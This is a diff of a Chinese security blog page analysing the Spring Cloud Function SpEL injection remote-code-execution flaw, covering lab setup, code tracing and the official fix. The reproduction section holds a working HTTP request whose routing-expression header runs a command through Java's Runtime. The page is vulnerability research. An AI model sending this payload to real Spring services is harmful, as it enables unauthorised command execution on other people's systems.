href="/tags/ThinkPHP/" style="font-size: 1.05rem;">ThinkPHP<sup>1</sup></a><a href="/tags/Windows/" style="font-size: 1.05rem;">Windows<sup>2</sup></a><a href="/tags/WordPress/" style="font-size: 1.05rem;">WordPress<sup>1</sup></a><a href="/tags/cuckoo/" style="font-size: 1.05rem;">cuckoo<sup>1</sup></a><a href="/tags/sandbox/" style="font-size: 1.05rem;">sandbox<sup>1</sup></a><a href="/tags/solution/" style="font-size: 1.05rem;">solution<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">三月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">十二月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/Analysis/" itemprop="url">Analysis</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/Java/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Java</span></a><a class="article-meta__tags" href="/tags/Spring/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Spring</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SpringCloud Function SPEL RCE analysis</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2022-03-29T04:46:03.000Z" title="发表于 2022-03-29 12:46:03">2022-03-29</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2022-03-31T13:18:00.000Z" title="更新于 2022-03-31 21:18:00">2022-03-31</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">728</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为山东"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>山东</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291415715.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://www.saferoad.cc/Analysis/SpringCloud-Function-SPEL-RCE-analysis.html"><header><a class="post-meta-categories" href="/categories/Analysis/" itemprop="url">Analysis</a><a href="/tags/Java/" tabindex="-1" itemprop="url">Java</a><a href="/tags/Spring/" tabindex="-1" itemprop="url">Spring</a><h1 id="CrawlerTitle" itemprop="name headline">SpringCloud Function SPEL RCE analysis</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">S0cke3t</span><time itemprop="dateCreated datePublished" datetime="2022-03-29T04:46:03.000Z" title="发表于 2022-03-29 12:46:03">2022-03-29</time><time itemprop="dateCreated datePublished" datetime="2022-03-31T13:18:00.000Z" title="更新于 2022-03-31 21:18:00">2022-03-31</time></header><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>近日，Spring Cloud Function 官方测试用例曝光了 Spring Cloud Function SPEL 表达式注入漏洞，可利用该漏洞通过注入 SPEL 表达式来触发远程命令执行。Spring Cloud Function 是一个基于 Spring Boot 的函数计算框架。通过抽象传输细节和基础设施，为开发者保留熟悉的开发工具和开发流程，让开发者专注于实现业务逻辑，从而提高开发效率。</p>
 <h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><blockquote>
 <p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p>
 </blockquote>
-<h4 id="环境构建"><a href="#环境构建" class="headerlink" title="环境构建"></a>环境构建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class="line-numbers language-hljs plaintext"><code class="language-hljs plaintext">JDK: 17.0.2<br>IDEA 2021.3 x64<br>Windows 10 21H2 x64<br><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></td></tr></table></figure>
+<h4 id="环境构建"><a href="#环境构建" class="headerlink" title="环境构建"></a>环境构建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs plaintext"><code class="language-hljs plaintext">JDK: 17.0.2<br>IDEA 2021.3 x64<br>Windows 10 21H2 x64<br></code></pre></td></tr></table></figure>
 
 
 
 <p>使用github上 <a target="_blank" rel="noopener" href="https://github.com/cckuailong/spring-cloud-function-SpEL-RCE">cckuailong</a>师傅创建的环境</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291252633.png" alt="image-20220329125233391" class="lazyload"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291252633.png" alt="image-20220329125233391"></p>
 <p>拉取仓库后用IDEA maven进行打包调试即可.由于spring默认端口使用的8080,所以可能会与Burpsuite冲突.可编辑<code>application.properties</code>修改默认端口</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291257431.png" alt="image-20220329125724382" class="lazyload"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291257431.png" alt="image-20220329125724382"></p>
 <h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>待服务端启动后,向spring服务请求如下数据包</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre class="line-numbers language-hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/speltest</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8090<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>cross-site<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation"><code class="language-hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/speltest</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8090<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>cross-site<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br>spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc.exe")<br><br><br><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre class=" language-hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/speltest</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8090<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>cross-site<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation"><code class="language-hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/speltest</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8090<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>cross-site<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br>spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc.exe")<br><br><br></code></pre></td></tr></table></figure>
 
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291259230.png" alt="image-20220329125946117" class="lazyload"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291259230.png" alt="image-20220329125946117"></p>
 <h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>首先来看一下官方提交的commit</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f">https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f</a></p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291407572.png" alt="image-20220329140718470" class="lazyload"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291407572.png" alt="image-20220329140718470"></p>
 <p>根据官方commit, 可以得知该漏洞是由RoutingFunction功能所导致</p>
 <p>在commit中官方也给出了相应的测试用例</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291309615.png" alt="image-20220329130921569" class="lazyload"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291309615.png" alt="image-20220329130921569"></p>
 <p>根据测试用例,可以得知漏洞触发点位于http header中<code>spring.cloud.function.routing-expression</code>字段</p>
 <p>首先,在所有路由的postmapping上打入断点,程序在进入到form后获取了当前的wapper,随后进入到processRequest</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291341310.png" alt="image-20220329134104253" class="lazyload"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291341310.png" alt="image-20220329134104253"></p>
 <p>跟进</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291343055.png" alt="image-20220329134324974" class="lazyload"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291343055.png" alt="image-20220329134324974"></p>
 <p>在processRequest中首先获取了当前wrapper的function,随后调用该function对象的apply</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291345377.png" alt="image-20220329134550327" class="lazyload"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291345377.png" alt="image-20220329134550327"></p>
 <p>apply中紧接着调用了wrapper的doApply</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291348933.png" alt="image-20220329134800863" class="lazyload"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291348933.png" alt="image-20220329134800863"></p>
 <p>doApply中首先判断wrapper是否是RoutingFunction,如果不是RoutingFunction则获取其target属性并调用其apply方法,而在此处当前wrapper的target属性正好是一个RoutingFunction</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291352844.png" alt="image-20220329135251776" class="lazyload"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291352844.png" alt="image-20220329135251776"></p>
 <p>apply中直接调用了route方法,所以直接来看route</p>
 <p>在route中判断header头中是否有<code>spring.cloud.function.routing-expression</code>, 随后调用functionFromExpression</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291356623.png" alt="image-20220329135641580" class="lazyload"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291356623.png" alt="image-20220329135641580"></p>
 <p>到functionFromExpression中,即调用Expression对传入的SPEL表达式进行解析,随后调用expression.getValue执行</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291400948.png" alt="image-20220329140001848" class="lazyload"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291400948.png" alt="image-20220329140001848"></p>
 <h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>在修复版本中对header使用SimpleEvaluationContext进行安全处理</p>
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291406532.png" alt="image-20220329140402292" class="lazyload"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291406532.png" alt="image-20220329140402292"></p>
 <h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f">https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f</a></p>
-
-  </article>
-
-  
-      
-    <div class="nexmoe-post-copyright">
-        <strong>本文作者：</strong>S0cke3t<br>
-        <strong>本文链接：</strong><a href="https://www.saferoad.cc/Analysis/SpringCloud-Function-SPEL-RCE-analysis.html" title="https:&#x2F;&#x2F;www.saferoad.cc&#x2F;Analysis&#x2F;SpringCloud-Function-SPEL-RCE-analysis.html" target="_blank" rel="noopener">https:&#x2F;&#x2F;www.saferoad.cc&#x2F;Analysis&#x2F;SpringCloud-Function-SPEL-RCE-analysis.html</a><br>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://avatars.githubusercontent.com/u/34375573?v=4" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://avatars.githubusercontent.com/u/34375573?v=4" title="头像" alt="头像"></a><div class="post-copyright__author_name">S0cke3t</div><div class="post-copyright__author_desc">Love Without Limits</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://www.saferoad.cc/Analysis/SpringCloud-Function-SPEL-RCE-analysis.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://www.saferoad.cc/Analysis/SpringCloud-Function-SPEL-RCE-analysis.html')">SpringCloud Function SPEL RCE analysis</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://www.saferoad.cc/Analysis/SpringCloud-Function-SPEL-RCE-analysis.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=SpringCloud Function SPEL RCE analysis&amp;url=https://www.saferoad.cc/Analysis/SpringCloud-Function-SPEL-RCE-analysis.html&amp;pic=https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291415715.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.saferoad.cc" target="_blank">S0cke3t Blog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/Java/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Java<span class="tagsPageCount">10</span></a><a class="post-meta__box__tags" href="/tags/Spring/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Spring<span class="tagsPageCount">3</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2024/08/20/202408201524451.jpeg" 